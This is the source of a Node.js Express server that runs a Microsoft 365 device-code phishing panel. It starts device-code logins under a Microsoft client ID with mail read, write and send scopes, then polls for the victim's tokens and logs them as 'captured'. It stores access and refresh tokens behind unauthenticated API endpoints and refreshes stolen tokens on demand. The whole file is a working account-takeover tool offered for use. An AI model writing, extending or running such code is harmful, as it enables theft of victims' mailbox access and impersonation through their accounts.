const express = require('express');
const axios = require('axios');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// ============================================
// YOUR AZURE APP CLIENT ID (Graph API Scope)
// ============================================
const GRAPH_CLIENT_ID = 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
const PRT_CLIENT_ID = '29d9ed98-a469-4536-ade2-f981bc1d605e';
// ============================================

let userSessions = new Map();
let pendingAuth = new Map();

// Store tokens separately like your friend's panel
let accessTokens = [];
let refreshTokens = [];

function generateId() {
    return accessTokens.length + refreshTokens.length + 1;
}

function getClientIp(req) {
    return req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Unknown';
}

// ============================================
// START ENDPOINT - Returns device code
// ============================================
app.post('/start', async (req, res) => {
    try {
        const sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        const clientIp = getClientIp(req);
        const userAgent = req.headers['user-agent'] || 'Unknown';
        
        // Use Graph API client for access tokens
        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
            new URLSearchParams({
                client_id: GRAPH_CLIENT_ID,
                scope: 'https://graph.microsoft.com/Mail.Read https://graph.microsoft.com/Mail.ReadWrite https://graph.microsoft.com/Mail.Send https://graph.microsoft.com/User.Read offline_access'
            }), {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );
        
        const { device_code, user_code, expires_in, interval } = response.data;
        
        pendingAuth.set(device_code, {
            device_code,
            user_code,
            sessionId,
            ip: clientIp,
            userAgent,
            status: 'pending',
            createdAt: Date.now(),
            expiresAt: Date.now() + (expires_in * 1000)
        });
        
        // Start polling for token
        pollForToken(device_code, sessionId);
        
        console.log(`[START] Generated code: ${user_code} for session: ${sessionId}`);
        
        res.json({
            userCode: user_code,
            deviceCode: device_code,
            sessionId: sessionId,
            interval: interval || 5,
            expiresIn: expires_in
        });
        
    } catch (err) {
        console.error('[START] Error:', err.message);
        res.status(500).json({ error: err.message });
    }
});

// ============================================
// Poll for token - Creates both Access and Refresh tokens
// ============================================
async function pollForToken(device_code, sessionId) {
    const pollInterval = setInterval(async () => {
        const pending = pendingAuth.get(device_code);
        if (!pending || pending.status !== 'pending') {
            clearInterval(pollInterval);
            return;
        }
        
        if (Date.now() > pending.expiresAt) {
            pending.status = 'expired';
            pendingAuth.delete(device_code);
            clearInterval(pollInterval);
            console.log(`[POLL] Session ${sessionId} expired`);
            return;
        }
        
        try {
            const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
                new URLSearchParams({
                    grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
                    client_id: GRAPH_CLIENT_ID,
                    device_code: device_code
                }), {
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
                }
            );
            
            const tokens = response.data;
            
            // Get user info
            const userInfo = await axios.get('https://graph.microsoft.com/v1.0/me', {
                headers: { 'Authorization': `Bearer ${tokens.access_token}` }
            });
            
            const userEmail = userInfo.data.mail || userInfo.data.userPrincipalName;
            
            // Store Access Token (Graph API)
            const accessTokenId = generateId();
            accessTokens.push({
                id: accessTokenId,
                user: userEmail,
                resource: 'Graph API',
                description: 'Graph API token - for Outlook/OneDrive',
                accesstoken: tokens.access_token,
                issued_at: new Date().toISOString(),
                expires_at: new Date(Date.now() + (tokens.expires_in * 1000)).toISOString()
            });
            
            // Store Refresh Token (PRT) - Separate entry
            if (tokens.refresh_token) {
                const refreshTokenId = generateId() + 100;
                refreshTokens.push({
                    id: refreshTokenId,
                    user: userEmail,
                    resource: 'https://graph.microsoft.com',
                    description: 'Refresh token captured via device code',
                    refreshtoken: tokens.refresh_token
                });
            }
            
            pending.status = 'success';
            pending.email = userEmail;
            pendingAuth.delete(device_code);
            clearInterval(pollInterval);
            
            console.log(`✅✅✅ CAPTURED TOKENS for ${userEmail}`);
            console.log(`   Access Token: ${tokens.access_token.substring(0, 50)}...`);
            console.log(`   Refresh Token: ${tokens.refresh_token ? 'YES' : 'NO'}`);
            
        } catch (err) {
            // Normal - waiting for user
            if (err.response?.data?.error !== 'authorization_pending') {
                // console.log('[POLL] Waiting for user...');
            }
        }
    }, 3000);
}

// ============================================
// STATE ENDPOINT - Check authentication status
// ============================================
app.get('/state', async (req, res) => {
    const deviceCode = req.query.device_code;
    
    if (!deviceCode) {
        return res.status(400).json({ error: 'Missing device_code' });
    }
    
    const pending = pendingAuth.get(deviceCode);
    
    if (pending) {
        if (pending.status === 'success') {
            return res.json({ status: 'success' });
        } else if (pending.status === 'pending') {
            return res.json({ status: 'pending' });
        } else if (pending.status === 'expired') {
            return res.json({ status: 'error', error: 'Code expired' });
        }
    }
    
    res.json({ status: 'pending' });
});

// ============================================
// API: List Access Tokens (like your friend's panel)
// ============================================
app.get('/api/list_access_tokens', async (req, res) => {
    res.json(accessTokens);
});

// ============================================
// API: List Refresh Tokens (PRT)
// ============================================
app.get('/api/list_refresh_tokens', async (req, res) => {
    res.json(refreshTokens);
});

// ============================================
// API: Get specific access token
// ============================================
app.get('/api/get_access_token/:id', async (req, res) => {
    const token = accessTokens.find(t => t.id == req.params.id);
    if (!token) return res.status(404).json({ error: 'Token not found' });
    res.json({ accesstoken: token.accesstoken });
});

// ============================================
// API: Delete access token
// ============================================
app.delete('/api/delete_access_token/:id', async (req, res) => {
    const index = accessTokens.findIndex(t => t.id == req.params.id);
    if (index !== -1) {
        accessTokens.splice(index, 1);
        res.json({ success: true });
    } else {
        res.status(404).json({ error: 'Token not found' });
    }
});

// ============================================
// API: Delete refresh token
// ============================================
app.delete('/api/delete_refresh_token/:id', async (req, res) => {
    const index = refreshTokens.findIndex(t => t.id == req.params.id);
    if (index !== -1) {
        refreshTokens.splice(index, 1);
        res.json({ success: true });
    } else {
        res.status(404).json({ error: 'Token not found' });
    }
});

// ============================================
// API: Get all sessions (simplified)
// ============================================
app.get('/api/sessions', async (req, res) => {
    const sessions = accessTokens.map(t => ({
        sessionId: t.id,
        email: t.user,
        ip: 'Captured',
        userAgent: 'Device Code Flow',
        capturedAt: t.issued_at,
        hasPRT: true
    }));
    res.json({ sessions });
});

// ============================================
// Generate Access Token from Refresh Token (PRT)
// ============================================
app.post('/api/refresh_access_token', async (req, res) => {
    const { refresh_token } = req.body;
    
    if (!refresh_token) {
        return res.status(400).json({ error: 'Missing refresh_token' });
    }
    
    try {
        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
            new URLSearchParams({
                grant_type: 'refresh_token',
                refresh_token: refresh_token,
                client_id: GRAPH_CLIENT_ID
            }), {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );
        
        const tokens = response.data;
        
        res.json({
            success: true,
            access_token: tokens.access_token,
            expires_in: tokens.expires_in
        });
        
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.delete('/api/sessions/clear', async (req, res) => {
    accessTokens = [];
    refreshTokens = [];
    res.json({ success: true });
});

// Serve files
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`\n========================================`);
    console.log(`✅ Server running on http://localhost:${PORT}`);
    console.log(`========================================`);
});
